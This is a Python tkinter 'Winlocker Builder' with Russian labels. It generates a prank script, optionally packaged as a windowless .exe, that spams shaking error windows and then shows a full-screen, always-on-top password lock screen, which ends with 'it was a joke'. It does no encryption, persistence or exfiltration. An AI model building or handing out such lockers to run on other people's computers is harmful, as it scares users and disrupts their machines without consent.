import tkinter as tk
from tkinter import messagebox, colorchooser
import os
import subprocess

class OLX_Pro_Builder:
    def __init__(self, root):
        self.root = root
        self.root.title("OLX Winlocker Builder PRO")
        self.root.geometry("500x850")
        
        lbl = {"font": ("Arial", 9, "bold")}
        
        tk.Label(root, text="НАСТРОЙКИ OLX WINLOCKER", font=("Arial", 14, "bold"), fg="red").pack(pady=10)

        # Поля настроек
        self.spam_count = self.create_entry("Кол-во окон:", "5")
        self.spam_text = self.create_entry("Текст в окнах:", "УПС!")
        self.spam_time = self.create_entry("Время тряски (сек):", "5")
        self.lock_text = self.create_entry("Текст блокировки:", "КОМПЬЮТЕР ЗАБЛОКИРОВАН!")
        self.lock_pass = self.create_entry("Пароль:", "1234")
        self.lock_time = self.create_entry("Задержка (1-5 сек):", "3")
        self.joke_text = self.create_entry("Текст после ошибки:", "ЭТО БЫЛА ШУТКА!")
        self.win_w = self.create_entry("Ширина окон:", "400")
        self.win_h = self.create_entry("Высота окон:", "200")
        
        self.bg_color = "#ff0000"
        tk.Button(root, text="ВЫБРАТЬ ЦВЕТ ФОНА", command=self.pick_color).pack(pady=5)

        self.file_name = self.create_entry("НАЗВАНИЕ ФАЙЛА:", "ru_locker")

        # ВЫБОР ФОРМАТА
        tk.Label(root, text="ВЫБЕРИТЕ ФОРМАТ:", **lbl).pack(pady=10)
        self.format_var = tk.StringVar(value="py")
        tk.Radiobutton(root, text=".py (Исходный код)", variable=self.format_var, value="py").pack()
        tk.Radiobutton(root, text=".exe (Исполняемый файл)", variable=self.format_var, value="exe").pack()

        tk.Button(root, text="СОЗДАТЬ ПРИЛОЖЕНИЕ", bg="green", fg="white", 
                  font=("Arial", 12, "bold"), command=self.generate, height=2).pack(pady=20)

    def create_entry(self, text, default):
        tk.Label(self.root, text=text).pack()
        e = tk.Entry(self.root, width=40, justify="center")
        e.insert(0, default)
        e.pack()
        return e

    def pick_color(self):
        color = colorchooser.askcolor()
        if color[1]: self.bg_color = color[1]

    def generate(self):
        s_time = min(int(self.spam_time.get()), 10) * 1000
        l_time = max(1, min(int(self.lock_time.get()), 5)) * 1000
        name = self.file_name.get().strip() or "joke"
        py_file = f"{name}.py"

        # Код самого винлокера
        code = f"""
import tkinter as tk
import random
import time

def draw_flag(parent):
    canvas = tk.Canvas(parent, width=150, height=90, highlightthickness=0)
    canvas.place(relx=1.0, rely=0.0, anchor='ne', x=-20, y=20)
    canvas.create_rectangle(0, 0, 150, 30, fill="white", outline="")
    canvas.create_rectangle(0, 30, 150, 60, fill="blue", outline="")
    canvas.create_rectangle(0, 60, 150, 90, fill="red", outline="")

def start_joke():
    spam = []
    for _ in range({self.spam_count.get()}):
        w = tk.Toplevel()
        w.title("ERROR")
        w.geometry("{self.win_w.get()}x{self.win_h.get()}")
        w.configure(bg="{self.bg_color}")
        draw_flag(w)
        tk.Label(w, text="{self.spam_text.get()}", font=("Arial", 15), bg="{self.bg_color}").pack(expand=True)
        spam.append(w)

    start = time.time() * 1000
    while time.time() * 1000 - start < {s_time}:
        for w in spam:
            nx = random.randint(0, root.winfo_screenwidth()-200)
            ny = random.randint(0, root.winfo_screenheight()-200)
            w.geometry(f"+{{nx}}+{{ny}}")
        root.update()
        time.sleep(0.05)
    for w in spam: w.destroy()

    lock = tk.Toplevel()
    lock.attributes("-topmost", True)
    lock.overrideredirect(True)
    lock.geometry(f"{{root.winfo_screenwidth()}}x{{root.winfo_screenheight()}}+0+0")
    lock.configure(bg="{self.bg_color}")
    draw_flag(lock)

    content = tk.Frame(lock, bg="{self.bg_color}")
    content.pack(expand=True)
    tk.Label(content, text="{self.lock_text.get()}", font=("Arial", 30), bg="{self.bg_color}").pack()
    pwd_entry = tk.Entry(content, font=("Arial", 20), show="*")
    pwd_entry.pack(pady=20)
    
    def check():
        if pwd_entry.get() == "{self.lock_pass.get()}":
            root.destroy()
        else:
            lock.destroy()
            show_final()

    tk.Button(content, text="ОК", command=check, width=10).pack()
    root.after({l_time}, lambda: None) 

def show_final():
    final = tk.Tk()
    final.geometry("{self.win_w.get()}x{self.win_h.get()}")
    final.configure(bg="{self.bg_color}")
    draw_flag(final)
    tk.Label(final, text="{self.joke_text.get()}", font=("Arial", 12), bg="{self.bg_color}").pack(expand=True)
    final.mainloop()

root = tk.Tk()
root.withdraw()
start_joke()
root.mainloop()
"""
        # Сначала всегда создаем .py файл
        with open(py_file, "w", encoding="utf-8") as f:
            f.write(code.strip())

        # Если выбран EXE
        if self.format_var.get() == "exe":
            messagebox.showinfo("Сборка", "Начинается компиляция в EXE. Это займет около минуты. Не закрывай программу!")
            try:
                # Запускаем PyInstaller через subprocess
                subprocess.run(["pyinstaller", "--onefile", "--noconsole", py_file], check=True)
                messagebox.showinfo("Готово", f"EXE файл создан в папке 'dist'.\\nСам исходник {py_file} сохранен рядом.")
            except Exception as e:
                messagebox.showerror("Ошибка", f"Не удалось собрать EXE: {e}\\nУбедись, что установлен pyinstaller (pip install pyinstaller)")
        else:
            messagebox.showinfo("Готово", f"Файл {py_file} успешно создан!")

if __name__ == "__main__":
    app = OLX_Pro_Builder(tk.Tk())
    tk.mainloop()
